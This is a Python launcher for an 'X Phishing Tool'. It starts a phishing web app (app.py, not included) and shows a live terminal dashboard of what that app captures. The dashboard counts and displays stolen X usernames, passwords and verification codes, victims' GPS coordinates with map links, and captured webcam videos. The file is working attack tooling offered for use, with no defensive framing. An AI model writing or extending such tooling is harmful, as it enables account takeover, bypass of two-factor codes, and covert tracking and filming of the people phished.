#!/usr/bin/env python3
import os
import subprocess
import sys
import time
import glob
import json
from datetime import datetime
import re
import io
import threading

# ANSI color codes
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
BOLD = "\033[1m"
RESET = "\033[0m"

# Global variables to store information
session_start_time = time.time()
login_count = 0
password_count = 0
verification_count = 0
locations_count = 0
captured_videos = 0
server_url = ""
last_username = ""
last_password = ""
last_verification_code = ""
last_location = {"latitude": "", "longitude": "", "google_maps_url": ""}
running = True

def clear_screen():
    """Clear the terminal screen based on OS"""
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    """Print the X phishing tool banner in red color"""
    banner = f"""{RED}{BOLD}
`8.`8888.      ,8' 
 `8.`8888.    ,8'  
  `8.`8888.  ,8'   
   `8.`8888.,8'    
    `8.`88888'     
    .88.`8888.     
   .8'`8.`8888.    
  .8'  `8.`8888.   
 .8'    `8.`8888.  
.8'      `8.`8888. 
{RESET}"""
    return banner

def is_file_from_current_session(file_path):
    """Check if the file was created in the current session"""
    try:
        creation_time = os.path.getctime(file_path)
        return creation_time >= session_start_time
    except Exception:
        return False

def count_login_data():
    """Count the number of login attempts in the current session"""
    data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
    login_files = glob.glob(os.path.join(data_dir, 'x_login_*.json'))
    # Filter files created in current session
    current_session_files = [f for f in login_files if is_file_from_current_session(f)]
    return len(current_session_files)

def count_password_data():
    """Count the number of password submissions in the current session"""
    data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
    password_files = glob.glob(os.path.join(data_dir, 'x_password_*.json'))
    # Filter files created in current session
    current_session_files = [f for f in password_files if is_file_from_current_session(f)]
    return len(current_session_files)

def count_verification_data():
    """Count the number of verification code submissions in the current session"""
    data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
    verify_files = glob.glob(os.path.join(data_dir, 'x_verify_*.json'))
    # Filter files created in current session
    current_session_files = [f for f in verify_files if is_file_from_current_session(f)]
    return len(current_session_files)

def count_location_data():
    """Count the number of locations captured in the current session"""
    data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
    location_files = glob.glob(os.path.join(data_dir, 'location_*.json'))
    # Filter files created in current session
    current_session_files = [f for f in location_files if is_file_from_current_session(f)]
    return len(current_session_files)

def count_captured_videos():
    """Count the number of verification videos captured in the current session"""
    videos_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'captured_videos')
    video_files = []
    for root, dirs, files in os.walk(videos_dir):
        for file in files:
            if file.endswith('.webm'):
                file_path = os.path.join(root, file)
                if is_file_from_current_session(file_path):
                    video_files.append(file_path)
    return len(video_files)

def get_latest_data():
    """Get the latest data from the current session"""
    global last_username, last_password, last_verification_code, last_location
    
    data_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
    
    # Get latest login
    login_files = glob.glob(os.path.join(data_dir, 'x_login_*.json'))
    # Filter and sort files from current session
    current_session_files = sorted([f for f in login_files if is_file_from_current_session(f)], reverse=True)
    if current_session_files:
        try:
            with open(current_session_files[0], 'r', encoding='utf-8') as f:
                login_data = json.load(f)
                last_username = login_data.get('username', '')
        except Exception:
            pass
    
    # Get latest password
    password_files = glob.glob(os.path.join(data_dir, 'x_password_*.json'))
    # Filter and sort files from current session
    current_session_files = sorted([f for f in password_files if is_file_from_current_session(f)], reverse=True)
    if current_session_files:
        try:
            with open(current_session_files[0], 'r', encoding='utf-8') as f:
                password_data = json.load(f)
                last_password = password_data.get('password', '')
        except Exception:
            pass
    
    # Get latest verification code
    verify_files = glob.glob(os.path.join(data_dir, 'x_verify_*.json'))
    # Filter and sort files from current session
    current_session_files = sorted([f for f in verify_files if is_file_from_current_session(f)], reverse=True)
    if current_session_files:
        try:
            with open(current_session_files[0], 'r', encoding='utf-8') as f:
                verify_data = json.load(f)
                last_verification_code = verify_data.get('verification_code', '')
        except Exception:
            pass
    
    # Get latest location
    location_files = glob.glob(os.path.join(data_dir, 'location_*.json'))
    # Filter and sort files from current session
    current_session_files = sorted([f for f in location_files if is_file_from_current_session(f)], reverse=True)
    if current_session_files:
        try:
            with open(current_session_files[0], 'r', encoding='utf-8') as f:
                location_data = json.load(f)
                last_location = {
                    "latitude": location_data.get('latitude', ''),
                    "longitude": location_data.get('longitude', ''),
                    "google_maps_url": location_data.get('google_maps_url', '')
                }
        except Exception:
            pass

def update_display():
    """Update the display with the latest information"""
    global login_count, password_count, verification_count, locations_count, captured_videos, server_url
    
    while running:
        clear_screen()
        
        # Get updated counts from current session
        login_count = count_login_data()
        password_count = count_password_data()
        verification_count = count_verification_data()
        locations_count = count_location_data()
        captured_videos = count_captured_videos()
        
        # Get latest data from current session
        get_latest_data()
        
        # Print banner
        print(print_banner())
        
        # Print session information
        session_duration = time.time() - session_start_time
        hours, remainder = divmod(int(session_duration), 3600)
        minutes, seconds = divmod(remainder, 60)
        print(f"\n{YELLOW}Current Session Time:{RESET} {WHITE}{hours:02}:{minutes:02}:{seconds:02}{RESET}")
        
        # Print server URL at the top
        if server_url:
            print(f"\n{BLUE}{BOLD}┌───────────────────────────────────────────────────────────────┐{RESET}")
            print(f"{BLUE}{BOLD}│{RESET} {CYAN}X Phishing URL:{RESET} {GREEN}{server_url}{RESET}")
            print(f"{BLUE}{BOLD}└───────────────────────────────────────────────────────────────┘{RESET}")
        
        # Print captures from current session
        print(f"\n{YELLOW}{BOLD}CURRENT SESSION DATA:{RESET}")
        print(f"{CYAN}● Login Attempts:{RESET} {WHITE}{login_count}{RESET}")
        print(f"{CYAN}● Passwords Captured:{RESET} {WHITE}{password_count}{RESET}")
        print(f"{CYAN}● Verification Codes:{RESET} {WHITE}{verification_count}{RESET}")
        print(f"{CYAN}● Locations Captured:{RESET} {WHITE}{locations_count}{RESET}")
        print(f"{CYAN}● Videos Captured:{RESET} {WHITE}{captured_videos}{RESET}")
        
        # Print latest credentials from current session
        if last_username or last_password or last_verification_code:
            print(f"\n{YELLOW}{BOLD}LATEST CREDENTIALS:{RESET}")
            if last_username:
                print(f"{GREEN}● Username:{RESET} {WHITE}{last_username}{RESET}")
            if last_password:
                print(f"{GREEN}● Password:{RESET} {WHITE}{last_password}{RESET}")
            if last_verification_code:
                print(f"{GREEN}● Verification Code:{RESET} {WHITE}{last_verification_code}{RESET}")
        
        # Print location if available from current session
        if last_location["latitude"] and last_location["longitude"]:
            print(f"\n{YELLOW}{BOLD}LATEST LOCATION:{RESET}")
            print(f"{GREEN}● Latitude:{RESET} {WHITE}{last_location['latitude']}{RESET}")
            print(f"{GREEN}● Longitude:{RESET} {WHITE}{last_location['longitude']}{RESET}")
            if last_location["google_maps_url"]:
                print(f"{GREEN}● Maps URL:{RESET} {WHITE}{last_location['google_maps_url']}{RESET}")
        
        # Print bottom info bar
        print(f"\n{BLUE}{BOLD}┌───────────────────────────────────────────────────────────────┐{RESET}")
        print(f"{BLUE}{BOLD}│{RESET} {RED}X Phishing Tool{RESET} {BLUE}|{RESET} {YELLOW}Current Session Only{RESET} {BLUE}|{RESET} {YELLOW}Press Ctrl+C to exit{RESET}")
        print(f"{BLUE}{BOLD}└───────────────────────────────────────────────────────────────┘{RESET}")
        
        # Wait before updating again
        time.sleep(2)

def run_x_app():
    """Run the X phishing application and capture its output"""
    global server_url, running
    
    try:
        # Fix console encoding for Windows
        if os.name == 'nt':
            # Enable UTF-8 mode for Windows console
            os.system('chcp 65001 > nul')
            # Set environment variable to use UTF-8
            os.environ["PYTHONIOENCODING"] = "utf-8"
        
        # Path to the app.py file
        x_app_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'app.py')
        
        if not os.path.exists(x_app_path):
            print(f"Error: Could not find app.py at {x_app_path}")
            print("Make sure you're running this launcher from the correct directory.")
            return
        
        # Set up environment variables for UTF-8 and unbuffered output
        env = os.environ.copy()
        env["PYTHONIOENCODING"] = "utf-8"
        env["PYTHONUNBUFFERED"] = "1"
        
        # Run the app and capture its output
        process = subprocess.Popen([sys.executable, x_app_path], 
                                  stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT,
                                  universal_newlines=True,
                                  bufsize=1,
                                  env=env)
        
        # Process the output in real-time
        for line in iter(process.stdout.readline, ''):
            # Extract server URL
            if "* Running on" in line and not server_url:
                urls = re.findall(r'http://[^\s]+', line)
                if urls:
                    for url in urls:
                        if '127.0.0.1' not in url and 'localhost' not in url:
                            server_url = url
                            break
                    if not server_url and urls:
                        server_url = urls[0]
        
    except KeyboardInterrupt:
        pass
    except Exception as e:
        print(f"\nError: {str(e)}")
    finally:
        running = False
        if 'process' in locals() and process:
            try:
                process.terminate()
            except:
                pass

if __name__ == "__main__":
    # Record session start time
    session_start_time = time.time()
    
    # Start the display update thread
    display_thread = threading.Thread(target=update_display)
    display_thread.daemon = True
    display_thread.start()
    
    try:
        # Run the X app in the main thread
        run_x_app()
    except KeyboardInterrupt:
        print("\nExiting...")
    finally:
        running = False
        time.sleep(1)  # Give display thread time to finish
        clear_screen()
        print("X Phishing Tool has been stopped.") 